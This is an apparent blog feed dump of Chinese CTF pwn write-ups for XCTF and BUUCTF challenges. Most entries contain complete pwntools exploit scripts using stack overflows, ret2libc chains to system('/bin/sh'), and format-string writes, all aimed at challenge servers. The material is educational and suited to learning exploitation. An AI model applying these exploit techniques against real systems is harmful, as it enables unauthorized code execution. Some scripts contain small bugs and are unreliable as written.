mask sometimes allows more efficient execution. For example, assume the current format string counter is at 0xaabb and a write with with integer = 0xaa00 and mask = 0xff00 needs to be executed. In that case, since the lower byte is not covered by the mask, the write can be directly executed with a %hn sequence (so we will write 0xaabb, but that is ok because the mask only requires the upper byte to be correctly written).</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反应釜开关控制</title>
      <link href="/2022/01/14/tnt/"/>
      <url>/2022/01/14/tnt/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/14/tnt/checksec.png" alt="image-20220114174102502" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/14/tnt/run.png" alt="image-20220114174205890" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/14/tnt/main.png" alt="image-20220114174250585" style="zoom:80%;"><p><strong>write函数</strong></p><ul><li>头文件:&lt;unistd.h&gt;</li><li>write函数有两种用法<ul><li>一种是:ssize_t write(int fd,const void *buf,size_t nbyte);<ul><li>fd: 文件描述符,write是写,所以文件描述符就是1</li><li>buf: 指定的缓冲区,即指针,指向一段内存单元;</li><li>nbyte: 要写入稳定的字节数</li><li>返回值: 写入文档的字节数(成功);</li><li>write函数把buf中nbyte写入文件描述符handle所指的文档,成功时返回写的字节数,错误时返回-1.</li></ul></li><li>另一种是:write(const char* str,int n)<ul><li>str是字符指针或字符数组,用来存放一个字符串,n是int型,它用来表示输出显示字符串中字符的个数.</li><li>write(string,strlen(string));表示输出字符串常量</li></ul></li></ul></li></ul><p><strong>sprintf</strong></p><ul><li><p>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format [,argument,…]);，主要功能是把<a href="https://baike.baidu.com/item/%E6%A0%BC%E5%BC%8F%E5%8C%96/650">格式化</a>的数据写入某个<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913">字符</a>串中，即发送<a href="https://baike.baidu.com/item/%E6%A0%BC%E5%BC%8F%E5%8C%96/650">格式化</a>输出到 string 所指向的字符串。sprintf 是个<a href="https://baike.baidu.com/item/%E5%8F%98%E5%8F%82/9844833">变参</a>函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 snprintf函数，该函数可对写入字符数做出限制.</p></li><li><p>int sprintf(char *string, char *format [,argument,…]);</p></li><li><p><strong>string</strong>– 这是指向一个字符数组的指针，该数组存储了 C 字符串。</p></li><li><p><strong>format</strong>– 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是**%[flags][width][.precision][length]specifier**</p></li><li><p>***[argument]…***：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</p></li><li><p>把格式化的数据写入某个<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>缓冲区。</p></li><li><p><strong>返回值</strong></p><p>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p><p>sprintf 返回以<strong>format为格式argument为内容组成的结果</strong>被写入string的字节数，结束字符‘\0’不计入内。即，如果“Hello”被写入空间足够大的string后，函数sprintf 返回5。</p></li></ul><p><strong>gets()函数</strong></p><ul><li><p>头文件: #include&lt;stdio.h&gt;</p></li><li><p>get()函数用于从缓冲区中读取字符,其原型如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char *gets(char *string)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>gets()函数从流中读取数据,直到换行符或读到文件尾为止,最后加上NULL为字符串结束.所读取的字符串暂存在给定的参数string中</p></li><li><p>若成功则返回string的指针,否则返回NULL</p></li><li><p>由于gets()不检查字符串string的大小,必须遇到换行符或文件结尾才会结束输入,因此容易造成缓冲区溢出的安全性问题,导致程序崩溃,可以使用fgets()代替.</p></li></ul><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序中有gets函数,明显的栈溢出.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *elf = ELF("./tnt")log_level = 'debug'local = 0if local:    r = process("./tnt")else:    r = remote("111.200.241.244",63927)bin_sh = 0x04005FAshell = 0x04005F6payload = b'a'*(0x200+0x8) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2022/01/14/noname/"/>
      <url>/2022/01/14/noname/</url>
      
        <content type="html"><![CDATA[<h3 id="1-flat-args-preprocessor-None-length-None-filler-de-bruijn"><a href="#1-flat-args-preprocessor-None-length-None-filler-de-bruijn" class="headerlink" title="1. flat(*args, preprocessor = None, length = None, filler = de_bruijn(),"></a><strong>1. flat(*args, preprocessor = None, length = None, filler = de_bruijn(),</strong></h3><p>Flattens the arguments into a string.</p><p>This function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. It will then find every string and number inside those and flatten them out. Strings are inserted directly while numbers are packed using the <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a> function. Unicode strings are UTF-8 encoded.</p><p>Dictionary keys give offsets at which to place the corresponding values (which are recursively flattened). Offsets are relative to where the flattened dictionary occurs in the output (i.e. <code>{0: 'foo'}</code> is equivalent to <code>'foo'</code>). Offsets can be integers, unicode strings or regular strings. Integer offsets &gt;= <code>2**(word_size-8)</code> are converted to a string using <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a>. Unicode strings are UTF-8 encoded. After these conversions offsets are either integers or strings. In the latter case, the offset will be the lowest index at which the string occurs in filler. See examples below.</p><h3 id="2-fmtstr-payload"><a href="#2-fmtstr-payload" class="headerlink" title="2. fmtstr_payload()"></a>2. fmtstr_payload()</h3><p><strong>fmtstr_payload</strong>是pwntools里面的一个工具,用来简化对格式化字符串漏洞的构造工作.可以实现修改任意内存.</p><p>fmtstr_payload(偏移,{源地址,目的地址})</p><blockquote><p><strong>fmtstr_payload(offset,writes,numbwritten=0,write_size=’byte’)</strong></p></blockquote><blockquote><ul><li>第一个参数表示格式化字符串的偏移;</li><li>第二个参数表示需要利用%n写入的数据,采用字典形式</li><li>第三个参数表示已经输出的字符的个数,默认为0</li><li>第四个参数表=表示写入方式,是按字节(byte),双字节(short),四字节(int),分别对应hhn,hn,n,默认值为hhn.</li><li>返回值就是payload</li></ul></blockquote><p>  常用形式: fmtstr_payload(offset,{key:value})</p><p>  <strong>以下为pwnlib中的解释</strong>: <a href="https://docs.pwntools.com/en/stable/fmtstr.html">fmtstr_payload</a></p><p>  <code>pwnlib.fmtstr.fmtstr_payload</code><strong>(<em><strong>offset</strong></em>,</strong> <em>writes</em><strong>,</strong> <em>numbwritten=0</em><strong>,</strong> <em>write_size=’byte’</em><strong>)</strong> <strong>→ str</strong>[<a href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/fmtstr.py#L759-L814">source</a>]</p><p>  Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from <code>context.bits</code></p><p>  The overflows argument is a format-string-length to output-amount tradeoff: Larger values for <code>overflows</code> produce shorter format strings that generate more output at runtime.</p><p>Parameters:<br><strong>offset</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – the first formatter’s offset you control<br><strong>writes</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#dict"><em>dict</em></a>) – dict with addr, value <code>{addr: value, addr2: value2}</code><br><strong>numbwritten</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – number of byte already written by the printf function<br><strong>write_size</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a>) – must be <code>byte</code>, <code>short</code> or <code>int</code>. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)`<br><strong>overflows</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string<br><strong>strategy</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a>) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)<br> Returns:    The payload in order to do needed writes                     </p><p><strong>Examples</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">&gt;&gt;&gt; context.clear(arch = 'amd64')&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; context.clear(arch = 'i386')&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')b'%322419390c%5$na\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')b'%1c%3$na\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-scanf函数"><a href="#3-scanf函数" class="headerlink" title="3. scanf函数"></a>3. scanf函数</h3><ul><li><p>功能:通过键盘给程序中的变量赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int scanf(const char *format,...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>scanf(“输入控制符”,输入参数);</p><p>功能:将从键盘输入的字符转化为”输入控制符”所规定格式的数据,然后存入以输入参数的值为地址的变量中.</p></li></ul><h3 id="4-sys-execve系统调用"><a href="#4-sys-execve系统调用" class="headerlink" title="4.sys_execve系统调用"></a>4.sys_execve系统调用</h3><ul><li>这个系统调用需要设置5个寄存器<ul><li>eax = 11= 0xb</li><li>ebx = &amp;(“/bin/sh”)</li><li>ecx = edx = edi = 0</li></ul></li></ul><h3 id="5-stack-pivot"><a href="#5-stack-pivot" class="headerlink" title="5.stack pivot"></a>5.stack pivot</h3><ul><li>stack pivot 这种技术是一个对抗ASLR的利器.</li><li>stack pivot之所以重要,是因为其利用到的gadget几乎不可能找不到.在函数建立栈帧时有两条指令push ebp;mov ebp,esp,而退出时同样需要消除这两条指令的影响,即leave(mov esp,ebp;pop ebp).且leave一般紧跟着就是ret.因此,在存在栈溢出的程序中,只要我们能控制到栈中的ebp,我们就可以通过两次leave劫持栈.</li></ul><h3 id="6-IDA常用快捷键"><a href="#6-IDA常用快捷键" class="headerlink" title="6.IDA常用快捷键"></a>6.IDA常用快捷键</h3><ul><li>a: 将数据转换为字符串</li><li>d: 将代码转换成数据</li><li>c: 将数据转换为代码</li><li>esc: 回退键,能够倒回上一步操作的视图(只有在反汇编窗口才是这个作用,如果是在其他窗口按下esc,会关闭该窗口)</li><li>shift+f12: 可以打开string窗口,一键找出所有的字符串,右击setup,还能对窗口的属性进行设置</li><li>ctrl+w: 保存ida数据库</li><li>ctrl+s: 选择某个数据段,直接俄进行跳转</li><li>ctrl+鼠标滚轮: 能够调节流程试图的大小</li><li>x: 对着某个函数\变量按该快捷键,可以查看它的交叉引用</li><li>g: 直接跳转到某个地址</li><li>n: 更改变量的名称</li><li>y: 更改变量的类型</li><li>/: 在反编译后伪代码界面中写下注释</li><li>: 在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述,有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</li><li>; : 在反汇编后的界面下写下注释</li><li>ctrl+shift+w: 拍摄IDA快照</li><li>u: undefine,取消函数,代码,数据的定义.</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2022/01/14/stack-migrate/"/>
      <url>/2022/01/14/stack-migrate/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h4><h3 id="1-什么是栈迁移"><a href="#1-什么是栈迁移" class="headerlink" title="1. 什么是栈迁移?"></a>1. 什么是栈迁移?</h3><ul><li>EBP被称为栈帧寄存器,每一次函数调用都会通过栈帧对栈内数据进行维护.当我们想办法修改EBP寄存器到其他地方,那么函数的栈空间也就发生了变化.这就叫做栈迁移.</li></ul><h3 id="2-为什么要使用栈迁移-在什么情况下使用栈迁移"><a href="#2-为什么要使用栈迁移-在什么情况下使用栈迁移" class="headerlink" title="2.为什么要使用栈迁移?在什么情况下使用栈迁移?"></a>2.为什么要使用栈迁移?在什么情况下使用栈迁移?</h3><ul><li>首先要知道栈溢出在什么情况下可以getshell.大多数情况下我们可输入的字符远远超过了缓冲区与栈帧之间的距离.但是如果只能输入几个字节时就可以使用栈迁移.</li></ul><h3 id="3-如何利用栈迁移进行溢出"><a href="#3-如何利用栈迁移进行溢出" class="headerlink" title="3.如何利用栈迁移进行溢出"></a>3.如何利用栈迁移进行溢出</h3><ul><li>利用leave,ret指令.</li><li>溢出时需要的前提:即使我们溢出缓冲区的字节数很少,也需要覆盖到EBP和EIP这两个地方.</li><li>leave指令相当于mov esp,ebp;pop ebp ; ret指令相当于pop eip;</li><li>pop指令是把栈顶的值弹到指定的寄存器,也就是说esp会自动减一个单位.</li><li>决定可以将栈空间放在哪里,ret指令调用完函数以后可以干什么.</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>forgot</title>
      <link href="/2022/01/13/forgot/"/>
      <url>/2022/01/13/forgot/</url>
      
        <content type="html"><![CDATA[<ul><li><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/13/forgot/checksec.png" alt="image-20220113132119292" style="zoom:80%;"></li><li><h3 id="ida程序分析"><a href="#ida程序分析" class="headerlink" title="ida程序分析"></a>ida程序分析</h3></li></ul><p>​                                     <img src="/2022/01/13/forgot/fgets.png" alt="image-20220117123525818" style="zoom:80%;"></p><p>fgets函数有输入字符限制,没办法溢出,第二处的scanf是经典的栈溢出</p><p><img src="/2022/01/13/forgot/v.png" alt="image-20220117124040209"> v3<del>v12均为函数地址,v14算是下标,所以只要覆盖掉v3</del>v12中的任意一处,覆盖为cat flag 函数的地址.这里选择v3</p><img src="/2022/01/13/forgot/v14.png" alt="image-20220117124328690" style="zoom:80%;"><p>我们想让程序执行v3处的函数(被我们覆盖后的函数),就必须让v14=1(这样–v14的值便为0,所以就会执行v13处的函数),由于v14本来等于1,所以只要在for循环中不给它其他值的机会,所以让所有if的条件为假.</p><p>合法输入为:a<del>z 0</del>9 _-+.</p><img src="/2022/01/13/forgot/if.png" alt="image-20220117124908410" style="zoom:80%;"><p>  cat  flag函数最后调用此函数</p><img src="/2022/01/13/forgot/flag.png" alt="image-20220113162931499" style="zoom:80%;"><ul><li><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/13/forgot/run.png" alt="image-20220113163122226" style="zoom:67%;"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./forgot")local = 0if local:    r = process("./forgot")else:    r = remote("111.200.241.244",55953)flag_addr = 0x080486CCpayload = b'A'*(0x74-0x54) + p64(flag_addr)r.sendlineafter("&gt; ","NAME")r.sendlineafter("&gt; ",payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dice_game</title>
      <link href="/2022/01/12/dice-game/"/>
      <url>/2022/01/12/dice-game/</url>
      
        <content type="html"><![CDATA[<ol><li><p>dice_game</p><ul><li><p><strong>checksec</strong></p><img src="/2022/01/12/dice-game/checksec.png" alt="image-20220112185425348" style="zoom:80%;"></li></ul></li></ol><ul><li><ul><li><p><strong>扔进ida</strong></p><p>分析程序</p><img src="/2022/01/12/dice-game/win.png" alt="image-20220116193414755" style="zoom:80%;"><p><strong>memset()函数</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">void *memset(void *s,int c,unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>作用:</p><p>将指针变量s所指向的前n字节的内存单元用一个”整数”c替换,c是int型.它可以为任何类型的数据进行初始化.</p><p><strong>fflush()函数</strong>: 用于清空缓冲区,如果文件是以写的方式打开的,则把缓冲区内容写入文件.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  #include&lt;stdio.h&gt;int fflush(FILE *stream)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>函数说明:fflush()会强制将缓冲区内的数据写回参数stream指定的文件中.如果stream为null,fflush()会将所有打开文件数据更新.</p><p>fflush(stdin): 刷新缓冲区里面的东西输出到设备上去</p><p>fflush(stdout): 刷新缓冲区把缓冲区里面的东西输出到设备上去</p><p><strong>read()函数</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t read(int fd,void *buf, size_t count);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>函数说明:</p><p>read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中.若参数count为0,则read()不会有作用并返回0,.返回值为实际读取到的字节数,如果返回0表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</p></li></ul></li><li><p>本题关键: <strong>重写seed</strong></p></li><li><p><strong>void srand</strong></p><pre class="line-numbers language-none"><code class="language-none">void srand(unsigned seed);//srand函数是随机数发生器的初始化函数int rand(void) //rand函数用来产生随机数,当然是伪随机数.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>seed作用: srand函数的作用是根据参数seed,设置一个随机起始点,而rand函数根据这个起始点,产生随机数序列.默认的随机数种子一样,rand函数所产生的随机序列也一样.因此,为使每次程序运行都能产生不同的随机序列,每次都应一个不同的种子参数.</li><li>因为rand的内部实现是用线性同余法做的,它不是真的随机数,只不过是因为其周期特别长,所以有一定的范围可看成随机的,rand()会返回一随机数值,范围在0至RAND_MAX间.在调用此函数产生随机数前,必须先利用srand()设好随机数种子,如果未设随机数种子,rand()在调用时会自动设随机数种子为1.rand()产生的是假随机数字,每次执行时相同的.若要不同,以不同的值来初始化它.初始化的函数就是srand().</li></ul></li></ul><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from ctypes import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./dice_game")local = 0if local:    r = process("./dice_game")else:    r = remote("111.200.241.244",53285)libc = cdll.LoadLibrary("libc.so.6") res = []def dice_game():    for i in range(50):        rand = libc.rand()        res.append(rand % 6 + 1)    print(res)    dice_game()payload = b'a'*0x40 + p64(0)r.sendlineafter("your name: ",payload)for point in res:    r.sendlineafter("the point(1~6): ",str(point))flag = r.recvline()print(flag)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html#module-ctypes"><code>ctypes</code></a> 导出了 <em>cdll</em> 对象在 Linux 下，必须使用 <em>包含</em> 文件扩展名的文件名来导入共享库。因此不能简单使用对象属性的方式来导入库。因此，可以使用方法 <code>LoadLibrary()</code>，或构造 CDLL 对象来导入库。</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简单随机数绕过 </tag>
            
            <tag> xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf wp</title>
      <link href="/2022/01/12/buuctf/"/>
      <url>/2022/01/12/buuctf/</url>
      
        <content type="html"><![CDATA[<h3 id="1-pwn1"><a href="#1-pwn1" class="headerlink" title="1.pwn1"></a>1.pwn1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-warmup-csaw-2016"><a href="#2-warmup-csaw-2016" class="headerlink" title="2.warmup_csaw_2016"></a>2.warmup_csaw_2016</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-cisn-2019-n-1"><a href="#3-cisn-2019-n-1" class="headerlink" title="3.cisn_2019_n_1"></a>3.cisn_2019_n_1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')elf=ELF("./ciscn")local = 0if local:    r = process("./ciscn")else:    r = remote("node4.buuoj.cn",28539)v2=0x41348000 //11.28125的十六进制形式payload = b'a'*(0x30-0x04)+p64(v2)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-pwn1-sctf-201-6"><a href="#4-pwn1-sctf-201-6" class="headerlink" title="4.pwn1_sctf_201  6"></a>4.pwn1_sctf_201  6</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1_sctf")local = 0if local:    r = process("./pwn1_sctf")else:    r = remote("node4.buuoj.cn",28883)get_flag = 0x08048F0Dpayload = b'I'*20 + b'a'*4 + p32(get_flag)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-level0"><a href="#5-level0" class="headerlink" title="5.level0"></a>5.level0</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./level0")local = 0if local:    r = process("./level0")else:    r = remote("node4.buuoj.cn",26837)call_system = 0x0000000000400596payload = b'a'*0x80+p64(0)+p64(call_system)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-ciscn-2019-c-1"><a href="#6-ciscn-2019-c-1" class="headerlink" title="6.ciscn_2019_c_1"></a>6.ciscn_2019_c_1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os= 'linux',arch='amd64',log_level='debug')elf=ELF("./ciscn_2019")local = 0if local:    r = process("./ciscn_2019")else:    r = remote("node4.buuoj.cn",29853)def encrypt(paylaod):    l = list(payload)    for i in range(len(l)):        if l[i].isdigit():            l[i] = chr(ord(l[i])^0xF)        if l[i].isupper():            l[i] = chr(ord(l[i])^0xE)        if l[i].islower():            l[i] = chr(ord(l[i])^0xD)       return ''.join(l)             pop_rdi = 0x0000000000400c83pop_ret = 0x00000000004006b9main_addr = 0x0000000000400B28put_plt = elf.plt['puts']put_got = elf.got['puts']r.recv()r.sendline("1")r.recvuntil("encrypted")payload = b'1'*(0x50+8) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)payload = encrypt(payload)r.sendline(payload)r.recvuntil("Ciphertext\n")r.recvuntil("\n")puts_addr = u64(r.recvline()[:-1].ljust(8,'\x00'))log.success('puts_addr='+hex(puts_addr))puts_offset = 0x0809c0libc_base = puts_addr - puts_offsetlog.success('libc_base'+hex(libc_base))r.sendlineafter("choice!","1")system_offset = 0x04f440bin_sh_offset = 0x1b3e9asys_addr = libc_base + system_offsetbin_sh = libc_base + bin_sh_offsetpayload1 = b'a'*(0x50+0x8) + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)r.sendline(payload1)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-第五空间2019决赛pwn5"><a href="#7-第五空间2019决赛pwn5" class="headerlink" title="7.第五空间2019决赛pwn5"></a>7.第五空间2019决赛pwn5</h3><ul><li><p><strong>checksec</strong></p><img src="/2022/01/12/buuctf/checksec7.png" alt="image-20220116190256994" style="zoom:80%;"></li><li><p><strong>run</strong></p><img src="/2022/01/12/buuctf/run7.png" alt="image-20220116190432512" style="zoom:80%;"><p>很明显,输入name时有回显,则可能是栈溢出漏洞和格式化字符串.</p><p>​                                              <img src="/2022/01/12/buuctf/run7(2).png" alt="image-20220116193941078" style="zoom: 80%;"></p><blockquote><p>格式化字符串的利用:</p><p>%x数据以十六进制格式输出</p><p>%p打印地址形式</p><p>%n 是向第x个参数指向的地址写入”已经输出的字符数”</p></blockquote></li></ul><ul><li><p><strong>ida</strong></p><ul><li>疑似溢出点</li></ul><img src="/2022/01/12/buuctf/read7.png" alt="image-20220116191746571" style="zoom:67%;"><p>​                                               <img src="/2022/01/12/buuctf/buf7.png" alt="image-20220116191930521" style="zoom:67%;"></p><p>​                                                但是size太小,没办法溢出.</p><ul><li><p>发现直接调用system的地方</p><p>​                                         <img src="/2022/01/12/buuctf/system7.png" alt="image-20220116192118923" style="zoom:67%;"></p></li></ul></li></ul><p>​              </p><ul><li><p> <strong>思路</strong></p></li><li><p>思路1:直接利用格式化字符串改写unk_804C044之中的数据.第一个read利用格式化字符串漏洞修改unk_804C044的值,第二个read输入我们修改后的值去满足if判断从而执行system(‘/bin/sh’).</p></li><li><p>思路2:利用格式化字符串改写atoi的got地址,改为system_plt的地址.第一个read利用格式化字符串漏洞修改atoi_got为system_plt,第二个read输入”/bin/sh\x00”,执行system(“/bin/sh”).</p></li><li><p>思路3:unk_804C044是随机生成的,我们可以自己写入一个值,然后在第二个read时再发送这个值.</p></li><li><p><strong>exp</strong></p><ul><li><p>exp1</p><pre class="line-numbers 